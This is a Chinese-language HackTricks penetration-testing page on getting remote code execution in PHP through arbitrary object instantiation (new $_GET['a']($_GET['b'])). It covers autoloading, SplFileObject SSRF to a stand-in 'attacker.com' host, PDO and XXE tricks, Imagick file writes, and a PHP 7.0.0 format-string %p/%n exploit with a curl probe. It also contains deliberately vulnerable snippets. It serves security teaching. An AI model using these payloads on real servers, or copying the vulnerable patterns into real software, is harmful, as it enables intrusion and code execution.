# PHP - RCE 滥用对象创建: new $_GET["a"]($_GET["b"])

{{#include ../../../banners/hacktricks-training.md}}

这基本上是 [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) 的摘要

## 介绍

创建任意新对象，例如 `new $_GET["a"]($_GET["a"])`，可能导致远程代码执行 (RCE)，如 [**writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) 所述。本文件强调实现 RCE 的各种策略。

## 通过自定义类或 Autoloading 实现 RCE

语法 `new $a($b)` 用于实例化对象，其中 **`$a`** 表示类名，**`$b`** 是传递给构造函数的第一个参数。这些变量可以来自用户输入（例如 GET/POST），可能是字符串或数组，也可以来自 JSON，在那里它们可能表现为其他类型。

考虑下面的代码片段：
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

class App2 {
function App2 ($cmd) {
system($cmd);
}
}

$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
在这种情况下，将 `$a` 设置为 `App` 或 `App2`，并将 `$b` 设置为一个系统命令（例如 `uname -a`），会导致该命令被执行。

**Autoloading functions** 可以被利用，如果没有这些类可以直接访问。 这些函数在需要时会自动从文件加载类，并通过 `spl_autoload_register` 或 `__autoload` 定义：
```php
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

function __autoload($class_name) {
include $class_name . '.php';
};

spl_autoload_register();
```
自动加载（autoloading）的行为因 PHP 版本而异，从而提供不同的 RCE 可能性。

## 通过内置类的 RCE

如果缺少自定义类或自动加载器，**内置的 PHP 类** 可能足以实现 RCE。这些类的数量通常在 100 到 200 之间，取决于 PHP 版本和所安装的扩展。可以使用 `get_declared_classes()` 列出它们。

可以通过反射 API 找出感兴趣的构造函数，如下面的示例和链接 [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF) 所示。

**通过特定方法的 RCE 包括：**

### **SSRF + Phar Deserialization**

`SplFileObject` 类通过其构造函数启用 SSRF，允许连接到任意 URL：
```php
new SplFileObject('http://attacker.com/');
```
SSRF 可能在使用 Phar 协议时导致 PHP 8.0 之前版本的 deserialization attacks。

### **利用 PDOs**

PDO 类的构造函数允许通过 DSN strings 连接到数据库，可能允许文件创建或其他交互：
```php
new PDO("sqlite:/tmp/test.txt")
```
### **SoapClient/SimpleXMLElement XXE**

PHP 到 5.3.22 和 5.4.12 的版本容易受到通过 `SoapClient` 和 `SimpleXMLElement` 构造函数的 XXE 攻击，具体取决于 libxml2 的版本。

## RCE 通过 Imagick 扩展

在对**项目依赖项**的分析中，发现通过实例化新对象可以利用 **Imagick** 进行**命令执行**。这提供了利用漏洞的机会。

### VID parser

发现 VID 解析器能够将内容写入文件系统中的任意指定路径。这可能导致将 PHP shell 放置到可通过 Web 访问的目录中，从而实现远程代码执行（RCE）。

#### VID Parser + File Upload

需要注意的是 PHP 将上传的文件临时存放在 `/tmp/phpXXXXXX`。Imagick 中的 VID 解析器使用 **msl** 协议，可以在文件路径中处理通配符，从而将临时文件传送到选定的目标位置。该方法提供了在文件系统中实现任意文件写入的另一种途径。

### PHP 崩溃 + Brute Force

一种在[**original writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)中描述的方法涉及上传会在删除前触发服务器崩溃的文件。通过对临时文件名进行暴力猜测，Imagick 就有可能执行任意 PHP 代码。然而，该技术仅在过时的 ImageMagick 版本中有效。

## Format-string in class-name resolution (PHP 7.0.0 Bug #71105)

当用户输入控制类名（例如 `new $_GET['model']()`）时，PHP 7.0.0 在进行 `Throwable` 重构期间引入了一个短暂的 Bug，导致引擎在解析类名时错误地将其当作 printf 格式字符串处理。这使得可以在 PHP 内部利用经典的 printf 风格原语：leaks（使用 `%p`）、通过宽度说明符控制写入计数，以及针对进程内指针（例如 ELF 构建的 GOT 条目）使用 `%n` 执行任意写入。

Minimal repro vulnerable pattern:
```php
<?php
$model = $_GET['model'];
$object = new $model();
```
利用概述（来自参考）：
- Leak 地址 via `%p` in the class name to find a writable target:
```bash
curl "http://host/index.php?model=%p-%p-%p"
# Fatal error includes resolved string with leaked pointers
```
- 使用位置参数和宽度说明符设置精确的字节计数，然后 `%n` 将该值写入栈上可访问的地址，目标为 GOT 槽（例如 `free`）以部分覆盖为 `system`。
- 通过传递包含 shell 管道的类名来触发被劫持的函数，从而执行 `system("id")`。

Notes:
- 仅适用于 PHP 7.0.0 (Bug [#71105](https://bugs.php.net/bug.php?id=71105))；在随后的版本中已修复。严重性：critical（如果存在任意类实例化）。
- Typical payloads 串联多个 `%p` 遍历栈，然后使用 `%.<width>d%<pos>$n` 来实现部分覆盖。

## References

- [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#include ../../../banners/hacktricks-training.md}}
